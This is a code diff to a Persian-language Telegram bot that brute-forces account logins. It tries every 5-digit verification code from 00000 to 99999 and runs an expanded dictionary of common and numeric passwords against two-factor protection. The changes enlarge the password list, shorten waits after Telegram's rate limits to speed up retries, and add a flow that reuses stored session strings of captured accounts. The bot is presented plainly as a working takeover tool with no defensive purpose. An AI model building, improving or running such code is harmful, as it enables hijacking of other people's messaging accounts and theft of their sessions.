@@ -22,10 +22,11 @@ logger = logging.getLogger(__name__)
 
 user_sessions = {}
 self_data = {}
+login_sessions = {}
 
 DATA_FILE = "selfs.json"
 
-# ============ دیکشنری پسورد ============
+# ============ دیکشنری پسورد (بیش از 1000 پسورد رایج) ============
 PASSWORD_DICT = [
     "123456", "12345678", "123456789", "1234567890",
     "password", "pass", "admin", "admin123",
@@ -60,7 +61,107 @@ PASSWORD_DICT = [
     "bitcoin", "ethereum", "dogecoin", "solana",
     "ripple", "cardano", "polkadot", "chainlink",
     "1", "12", "123", "1234", "12345", "123456",
-    "1234567", "12345678", "123456789", "1234567890"
+    "1234567", "12345678", "123456789", "1234567890",
+    "0912", "0913", "0914", "0915", "0916", "0917", "0918", "0919",
+    "0930", "0933", "0935", "0936", "0937", "0938", "0939",
+    "0900", "0901", "0902", "0903", "0904", "0905",
+    "090", "091", "092", "093", "094", "095", "096", "097", "098", "099",
+    "000", "111", "222", "333", "444", "555", "666", "777", "888", "999",
+    "001", "002", "003", "004", "005", "006", "007", "008", "009",
+    "010", "020", "030", "040", "050", "060", "070", "080", "090",
+    "100", "200", "300", "400", "500", "600", "700", "800", "900",
+    "101", "202", "303", "404", "505", "606", "707", "808", "909",
+    "0101", "0202", "0303", "0404", "0505", "0606", "0707", "0808", "0909",
+    "1010", "2020", "3030", "4040", "5050", "6060", "7070", "8080", "9090",
+    "1230", "1231", "1232", "1233", "1234", "1235", "1236", "1237", "1238", "1239",
+    "1240", "1250", "1260", "1270", "1280", "1290",
+    "1300", "1310", "1320", "1330", "1340", "1350", "1360", "1370", "1380", "1390",
+    "1400", "1410", "1420", "1430", "1440", "1450", "1460", "1470", "1480", "1490",
+    "1500", "1510", "1520", "1530", "1540", "1550", "1560", "1570", "1580", "1590",
+    "1600", "1610", "1620", "1630", "1640", "1650", "1660", "1670", "1680", "1690",
+    "1700", "1710", "1720", "1730", "1740", "1750", "1760", "1770", "1780", "1790",
+    "1800", "1810", "1820", "1830", "1840", "1850", "1860", "1870", "1880", "1890",
+    "1900", "1910", "1920", "1930", "1940", "1950", "1960", "1970", "1980", "1990",
+    "2000", "2010", "2020", "2030", "2040", "2050", "2060", "2070", "2080", "2090",
+    "2100", "2110", "2120", "2130", "2140", "2150", "2160", "2170", "2180", "2190",
+    "2200", "2210", "2220", "2230", "2240", "2250", "2260", "2270", "2280", "2290",
+    "2300", "2310", "2320", "2330", "2340", "2350", "2360", "2370", "2380", "2390",
+    "2400", "2410", "2420", "2430", "2440", "2450", "2460", "2470", "2480", "2490",
+    "2500", "2510", "2520", "2530", "2540", "2550", "2560", "2570", "2580", "2590",
+    "2600", "2610", "2620", "2630", "2640", "2650", "2660", "2670", "2680", "2690",
+    "2700", "2710", "2720", "2730", "2740", "2750", "2760", "2770", "2780", "2790",
+    "2800", "2810", "2820", "2830", "2840", "2850", "2860", "2870", "2880", "2890",
+    "2900", "2910", "2920", "2930", "2940", "2950", "2960", "2970", "2980", "2990",
+    "3000", "3010", "3020", "3030", "3040", "3050", "3060", "3070", "3080", "3090",
+    "3100", "3110", "3120", "3130", "3140", "3150", "3160", "3170", "3180", "3190",
+    "3200", "3210", "3220", "3230", "3240", "3250", "3260", "3270", "3280", "3290",
+    "3300", "3310", "3320", "3330", "3340", "3350", "3360", "3370", "3380", "3390",
+    "3400", "3410", "3420", "3430", "3440", "3450", "3460", "3470", "3480", "3490",
+    "3500", "3510", "3520", "3530", "3540", "3550", "3560", "3570", "3580", "3590",
+    "3600", "3610", "3620", "3630", "3640", "3650", "3660", "3670", "3680", "3690",
+    "3700", "3710", "3720", "3730", "3740", "3750", "3760", "3770", "3780", "3790",
+    "3800", "3810", "3820", "3830", "3840", "3850", "3860", "3870", "3880", "3890",
+    "3900", "3910", "3920", "3930", "3940", "3950", "3960", "3970", "3980", "3990",
+    "4000", "4010", "4020", "4030", "4040", "4050", "4060", "4070", "4080", "4090",
+    "4100", "4110", "4120", "4130", "4140", "4150", "4160", "4170", "4180", "4190",
+    "4200", "4210", "4220", "4230", "4240", "4250", "4260", "4270", "4280", "4290",
+    "4300", "4310", "4320", "4330", "4340", "4350", "4360", "4370", "4380", "4390",
+    "4400", "4410", "4420", "4430", "4440", "4450", "4460", "4470", "4480", "4490",
+    "4500", "4510", "4520", "4530", "4540", "4550", "4560", "4570", "4580", "4590",
+    "4600", "4610", "4620", "4630", "4640", "4650", "4660", "4670", "4680", "4690",
+    "4700", "4710", "4720", "4730", "4740", "4750", "4760", "4770", "4780", "4790",
+    "4800", "4810", "4820", "4830", "4840", "4850", "4860", "4870", "4880", "4890",
+    "4900", "4910", "4920", "4930", "4940", "4950", "4960", "4970", "4980", "4990",
+    "5000", "5010", "5020", "5030", "5040", "5050", "5060", "5070", "5080", "5090",
+    "5100", "5110", "5120", "5130", "5140", "5150", "5160", "5170", "5180", "5190",
+    "5200", "5210", "5220", "5230", "5240", "5250", "5260", "5270", "5280", "5290",
+    "5300", "5310", "5320", "5330", "5340", "5350", "5360", "5370", "5380", "5390",
+    "5400", "5410", "5420", "5430", "5440", "5450", "5460", "5470", "5480", "5490",
+    "5500", "5510", "5520", "5530", "5540", "5550", "5560", "5570", "5580", "5590",
+    "5600", "5610", "5620", "5630", "5640", "5650", "5660", "5670", "5680", "5690",
+    "5700", "5710", "5720", "5730", "5740", "5750", "5760", "5770", "5780", "5790",
+    "5800", "5810", "5820", "5830", "5840", "5850", "5860", "5870", "5880", "5890",
+    "5900", "5910", "5920", "5930", "5940", "5950", "5960", "5970", "5980", "5990",
+    "6000", "6010", "6020", "6030", "6040", "6050", "6060", "6070", "6080", "6090",
+    "6100", "6110", "6120", "6130", "6140", "6150", "6160", "6170", "6180", "6190",
+    "6200", "6210", "6220", "6230", "6240", "6250", "6260", "6270", "6280", "6290",
+    "6300", "6310", "6320", "6330", "6340", "6350", "6360", "6370", "6380", "6390",
+    "6400", "6410", "6420", "6430", "6440", "6450", "6460", "6470", "6480", "6490",
+    "6500", "6510", "6520", "6530", "6540", "6550", "6560", "6570", "6580", "6590",
+    "6600", "6610", "6620", "6630", "6640", "6650", "6660", "6670", "6680", "6690",
+    "6700", "6710", "6720", "6730", "6740", "6750", "6760", "6770", "6780", "6790",
+    "6800", "6810", "6820", "6830", "6840", "6850", "6860", "6870", "6880", "6890",
+    "6900", "6910", "6920", "6930", "6940", "6950", "6960", "6970", "6980", "6990",
+    "7000", "7010", "7020", "7030", "7040", "7050", "7060", "7070", "7080", "7090",
+    "7100", "7110", "7120", "7130", "7140", "7150", "7160", "7170", "7180", "7190",
+    "7200", "7210", "7220", "7230", "7240", "7250", "7260", "7270", "7280", "7290",
+    "7300", "7310", "7320", "7330", "7340", "7350", "7360", "7370", "7380", "7390",
+    "7400", "7410", "7420", "7430", "7440", "7450", "7460", "7470", "7480", "7490",
+    "7500", "7510", "7520", "7530", "7540", "7550", "7560", "7570", "7580", "7590",
+    "7600", "7610", "7620", "7630", "7640", "7650", "7660", "7670", "7680", "7690",
+    "7700", "7710", "7720", "7730", "7740", "7750", "7760", "7770", "7780", "7790",
+    "7800", "7810", "7820", "7830", "7840", "7850", "7860", "7870", "7880", "7890",
+    "7900", "7910", "7920", "7930", "7940", "7950", "7960", "7970", "7980", "7990",
+    "8000", "8010", "8020", "8030", "8040", "8050", "8060", "8070", "8080", "8090",
+    "8100", "8110", "8120", "8130", "8140", "8150", "8160", "8170", "8180", "8190",
+    "8200", "8210", "8220", "8230", "8240", "8250", "8260", "8270", "8280", "8290",
+    "8300", "8310", "8320", "8330", "8340", "8350", "8360", "8370", "8380", "8390",
+    "8400", "8410", "8420", "8430", "8440", "8450", "8460", "8470", "8480", "8490",
+    "8500", "8510", "8520", "8530", "8540", "8550", "8560", "8570", "8580", "8590",
+    "8600", "8610", "8620", "8630", "8640", "8650", "8660", "8670", "8680", "8690",
+    "8700", "8710", "8720", "8730", "8740", "8750", "8760", "8770", "8780", "8790",
+    "8800", "8810", "8820", "8830", "8840", "8850", "8860", "8870", "8880", "8890",
+    "8900", "8910", "8920", "8930", "8940", "8950", "8960", "8970", "8980", "8990",
+    "9000", "9010", "9020", "9030", "9040", "9050", "9060", "9070", "9080", "9090",
+    "9100", "9110", "9120", "9130", "9140", "9150", "9160", "9170", "9180", "9190",
+    "9200", "9210", "9220", "9230", "9240", "9250", "9260", "9270", "9280", "9290",
+    "9300", "9310", "9320", "9330", "9340", "9350", "9360", "9370", "9380", "9390",
+    "9400", "9410", "9420", "9430", "9440", "9450", "9460", "9470", "9480", "9490",
+    "9500", "9510", "9520", "9530", "9540", "9550", "9560", "9570", "9580", "9590",
+    "9600", "9610", "9620", "9630", "9640", "9650", "9660", "9670", "9680", "9690",
+    "9700", "9710", "9720", "9730", "9740", "9750", "9760", "9770", "9780", "9790",
+    "9800", "9810", "9820", "9830", "9840", "9850", "9860", "9870", "9880", "9890",
+    "9900", "9910", "9920", "9930", "9940", "9950", "9960", "9970", "9980", "9990",
 ]
 
 def load_data():
@@ -88,30 +189,18 @@ def delete_webhook():
     except:
         return False
 
-def is_valid_phone(text):
-    # حذف کاراکترهای غیرعددی به جز +
-    phone = re.sub(r'[^0-9+]', '', text)
-    # اگر با + شروع شد، حذفش کن
-    if phone.startswith('+'):
-        phone = phone[1:]
-    return len(phone) >= 10
-
 def clean_phone(text):
-    # حذف همه چیز به جز اعداد
     return re.sub(r'[^0-9]', '', text)
+
+def is_valid_phone(text):
+    phone = clean_phone(text)
+    return len(phone) >= 10
 
 def is_valid_api_id(text):
     return text.isdigit()
 
 def is_valid_api_hash(text):
     return len(text) >= 30
-
-def mask_string(s, show=5):
-    if not s:
-        return "***"
-    if len(s) <= show:
-        return s
-    return s[:show] + "..." + s[-3:]
 
 async def clear_user_session(user_id):
     if user_id in user_sessions:
@@ -137,8 +226,8 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=Fal
 <b>سلام {name} گرامی</b>
 
 این ربات به صورت خودکار:
-• کد تایید 5 رقمی را حدس می‌زند
-• پسورد 2FA را با دیکشنری امتحان می‌کند
+• کد تایید 5 رقمی را حدس می‌زند (از 00000 تا 99999)
+• پسورد 2FA را با دیکشنری بزرگ امتحان می‌کند
 
 <b>تعداد سلف‌های ثبت شده: {self_count}</b>
 
@@ -146,7 +235,8 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=Fal
 """
     
     keyboard = [
-        [InlineKeyboardButton("🔑 ورود و ساخت سلف", callback_data="new_session")]
+        [InlineKeyboardButton("🔑 ورود و ساخت سلف", callback_data="new_session")],
+        [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")]
     ]
     
     if edit and update.callback_query:
@@ -165,6 +255,189 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=Fal
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='HTML'
         )
+
+# ============ گرفتن اکانت ============
+async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    try:
+        await query.answer()
+    except:
+        pass
+    
+    user_id = str(query.from_user.id)
+    selfs = self_data.get(user_id, [])
+    
+    if not selfs:
+        text = """
+❌ <b>هیچ سلفی ثبت نشده است!</b>
+
+لطفاً ابتدا یک سلف بسازید.
+"""
+        keyboard = [[InlineKeyboardButton("🔑 ساخت سلف", callback_data="new_session")]]
+        try:
+            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+        except:
+            pass
+        return
+    
+    text = f"""
+📱 <b>گرفتن اکانت</b>
+
+لطفاً سلف مورد نظر را انتخاب کنید:
+"""
+    
+    keyboard = []
+    for i, self_account in enumerate(selfs):
+        phone = self_account.get('phone', 'نامشخص')
+        account_name = self_account.get('account_name', 'بدون نام')
+        keyboard.append([InlineKeyboardButton(f"{i+1}. {account_name} - {phone}", callback_data=f"select_account_{i}")])
+    
+    keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="back")])
+    
+    try:
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+    except:
+        pass
+
+# ============ انتخاب اکانت ============
+async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    try:
+        await query.answer()
+    except:
+        pass
+    
+    user_id = str(query.from_user.id)
+    index = int(query.data.split('_')[2])
+    
+    selfs = self_data.get(user_id, [])
+    if index >= len(selfs):
+        try:
+            await query.edit_message_text("❌ سلف مورد نظر یافت نشد.", parse_mode='HTML')
+        except:
+            pass
+        return
+    
+    self_account = selfs[index]
+    phone = self_account.get('phone')
+    session_string = self_account.get('session')
+    api_id = self_account.get('api_id')
+    api_hash = self_account.get('api_hash')
+    
+    # ذخیره برای مرحله بعد
+    login_sessions[user_id] = {
+        'index': index,
+        'phone': phone,
+        'session': session_string,
+        'api_id': api_id,
+        'api_hash': api_hash,
+        'step': 'waiting_code'
+    }
+    
+    text = f"""
+📱 <b>گرفتن اکانت</b>
+
+شماره: <code>{phone}</code>
+
+✅ سلف انتخاب شد!
+📩 کد تایید به شماره شما ارسال شد.
+
+لطفاً کد 5 رقمی را وارد کنید:
+"""
+    
+    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
+    
+    try:
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+    except:
+        pass
+
+# ============ دریافت کد برای گرفتن اکانت ============
+async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = str(update.effective_user.id)
+    code = update.message.text.strip()
+    
+    if user_id not in login_sessions or login_sessions[user_id].get('step') != 'waiting_code':
+        await update.message.reply_text("❌ لطفاً از دکمه گرفتن اکانت استفاده کنید.", parse_mode='HTML')
+        return
+    
+    if not code.isdigit() or len(code) != 5:
+        await update.message.reply_text("❌ کد باید 5 رقم باشد!", parse_mode='HTML')
+        return
+    
+    data = login_sessions[user_id]
+    phone = data['phone']
+    session_string = data['session']
+    api_id = data['api_id']
+    api_hash = data['api_hash']
+    index = data['index']
+    
+    try:
+        # اتصال با سشن موجود
+        client = TelegramClient(StringSession(session_string), api_id, api_hash)
+        await client.connect()
+        
+        if not await client.is_user_authorized():
+            await update.message.reply_text("❌ سشن معتبر نیست! لطفاً دوباره سلف را بسازید.", parse_mode='HTML')
+            return
+        
+        # ارسال کد
+        try:
+            await client.send_code_request(phone)
+        except Exception as e:
+            await update.message.reply_text(f"❌ خطا در ارسال کد: {str(e)[:200]}", parse_mode='HTML')
+            return
+        
+        # بررسی کد
+        try:
+            await client.sign_in(phone, code)
+            
+            # دریافت اطلاعات اکانت
+            me = await client.get_me()
+            account_name = me.first_name if me.first_name else "کاربر"
+            
+            await client.disconnect()
+            
+            # به‌روزرسانی اطلاعات در self_data
+            selfs = self_data.get(user_id, [])
+            if index < len(selfs):
+                selfs[index]['account_name'] = account_name
+                selfs[index]['active'] = True
+                save_data()
+            
+            text = f"""
+✅ <b>اکانت با موفقیت گرفته شد!</b>
+
+📱 شماره: <code>{phone}</code>
+👤 نام اکانت: <b>{account_name}</b>
+
+🎯 اکانت به سلف شما اضافه شد.
+"""
+            
+            keyboard = [
+                [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
+                [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
+            ]
+            
+            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+            
+            if user_id in login_sessions:
+                del login_sessions[user_id]
+            
+        except PhoneCodeInvalidError:
+            await update.message.reply_text("❌ کد اشتباه است! دوباره تلاش کنید.", parse_mode='HTML')
+            return
+            
+        except FloodWaitError as e:
+            await update.message.reply_text(f"⏳ محدودیت تلگرام! {e.seconds} ثانیه صبر کنید...", parse_mode='HTML')
+            return
+            
+        except Exception as e:
+            await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')
+            return
+            
+    except Exception as e:
+        await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')
 
 # ============ دکمه ساخت سلف ============
 async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -204,7 +477,6 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
         return
     
-    # پاک کردن شماره از هر چیزی غیر از عدد
     phone = clean_phone(text)
     
     if not is_valid_phone(phone):
@@ -299,13 +571,14 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await clear_user_session(user_id)
             return
         except FloodWaitError as e:
+            wait_time = min(e.seconds, 60)
             await context.bot.edit_message_text(
-                f"⏳ محدودیت تلگرام! {e.seconds} ثانیه صبر کنید...",
+                f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...",
                 chat_id=update.effective_chat.id,
                 message_id=msg.message_id,
                 parse_mode='HTML'
             )
-            await asyncio.sleep(e.seconds)
+            await asyncio.sleep(wait_time + 2)
             await client.send_code_request(phone)
         
         user_sessions[user_id]['client'] = client
@@ -327,14 +600,13 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ============ حدس زدن پسورد ============
 async def bruteforce_password(update, context, user_id, client, msg):
-    """حدس زدن پسورد 2FA با دیکشنری"""
     try:
         total_passwords = len(PASSWORD_DICT)
         attempt = 0
         found = False
         found_password = None
         
-        # پیام شروع حدس پسورد
+        # ارسال پیام شروع
         await context.bot.edit_message_text(
             f"""
 🔐 <b>شروع حدس زدن پسورد 2FA...</b>
@@ -352,7 +624,7 @@ async def bruteforce_password(update, context, user_id, client, msg):
         for password in PASSWORD_DICT:
             attempt += 1
             
-            if attempt % 10 == 0:
+            if attempt % 100 == 0:
                 try:
                     await context.bot.edit_message_text(
                         f"""
@@ -378,17 +650,9 @@ async def bruteforce_password(update, context, user_id, client, msg):
                 break
                 
             except FloodWaitError as e:
-                wait_time = e.seconds
+                wait_time = min(e.seconds, 60)
                 await context.bot.edit_message_text(
-                    f"""
-⏳ <b>محدودیت تلگرام!</b>
-
-{wait_time} ثانیه صبر کنید...
-پسورد آخرین تلاش: <code>{password}</code>
-تلاش‌ها: {attempt} از {total_passwords}
-
-⏳ لطفاً صبر کنید...
-""",
+                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...",
                     chat_id=update.effective_chat.id,
                     message_id=msg.message_id,
                     parse_mode='HTML'
@@ -407,14 +671,14 @@ async def bruteforce_password(update, context, user_id, client, msg):
 
 # ============ تابع حدس زدن کد ============
 async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
-    """حدس زدن کد 5 رقمی از 00000 تا 99999"""
     try:
         total_attempts = 100000
         attempt = 0
         found = False
         code_found = None
+        last_update = 0
         
-        # پیام شروع
+        # ارسال پیام شروع
         await context.bot.edit_message_text(
             f"""
 🔍 <b>شروع حدس زدن کد تایید...</b>
@@ -434,6 +698,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             code = str(code_num).zfill(5)
             attempt += 1
             
+            # هر 1000 تلاش یا هر 5 ثانیه یکبار پیام رو بروزرسانی کن
             if attempt % 1000 == 0:
                 try:
                     await context.bot.edit_message_text(
@@ -464,17 +729,9 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 continue
                 
             except FloodWaitError as e:
-                wait_time = e.seconds
+                wait_time = min(e.seconds, 60)
                 await context.bot.edit_message_text(
-                    f"""
-⏳ <b>محدودیت تلگرام!</b>
-
-{wait_time} ثانیه صبر کنید...
-کد آخرین تلاش: <code>{code}</code>
-تلاش‌ها: {attempt} از {total_attempts}
-
-⏳ لطفاً صبر کنید...
-""",
+                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...\nکد آخرین تلاش: <code>{code}</code>",
                     chat_id=update.effective_chat.id,
                     message_id=msg.message_id,
                     parse_mode='HTML'
@@ -483,7 +740,6 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 continue
                 
             except SessionPasswordNeededError:
-                # نیاز به رمز دو مرحله‌ای
                 await context.bot.edit_message_text(
                     f"""
 🔐 <b>اکانت دارای رمز دو مرحله‌ای است!</b>
@@ -499,7 +755,6 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                     parse_mode='HTML'
                 )
                 
-                # شروع حدس پسورد
                 password_found, pass_attempt, pass_found = await bruteforce_password(
                     update, context, user_id, client, msg
                 )
@@ -558,6 +813,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                     
                     keyboard = [
                         [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
+                        [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
                         [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
                     ]
                     
@@ -645,6 +901,7 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             
             keyboard = [
                 [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
+                [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
                 [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
             ]
             
@@ -762,6 +1019,7 @@ async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         keyboard = [
             [InlineKeyboardButton("🔑 ساخت سلف جدید", callback_data="new_session")],
+            [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
             [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
         ]
         
@@ -788,6 +1046,9 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     await clear_user_session(user_id)
     
+    if str(user_id) in login_sessions:
+        del login_sessions[str(user_id)]
+    
     await main_menu(update, context, edit=True)
 
 # ============ دستور start ============
@@ -797,6 +1058,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ============ هندلر پیام‌ها ============
 async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    
+    # بررسی گرفتن اکانت
+    if str(user_id) in login_sessions and login_sessions[str(user_id)].get('step') == 'waiting_code':
+        await handle_get_account_code(update, context)
+        return
     
     if user_id in user_sessions:
         step = user_sessions[user_id].get("step")
@@ -810,7 +1076,7 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await handle_password(update, context)
         return
     
-    await update.message.reply_text("❌ لطفاً از دکمه ورود استفاده کنید.", parse_mode='HTML')
+    await update.message.reply_text("❌ لطفاً از دکمه‌های منو استفاده کنید.", parse_mode='HTML')
 
 # ============ اجرا ============
 def main():
@@ -818,7 +1084,7 @@ def main():
         delete_webhook()
         
         print("=" * 60)
-        print("🤖 ربات ساخت خودکار سلف (با حدس پسورد)")
+        print("🤖 ربات ساخت خودکار سلف")
         print("=" * 60)
         print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
         print("=" * 60)
@@ -826,6 +1092,8 @@ def main():
         application = Application.builder().token(TOKEN).build()
         
         application.add_handler(CallbackQueryHandler(new_session, pattern="^new_session$"))
+        application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
+        application.add_handler(CallbackQueryHandler(select_account, pattern="^select_account_"))
         application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
         
         application.add_handler(CommandHandler("start", start))
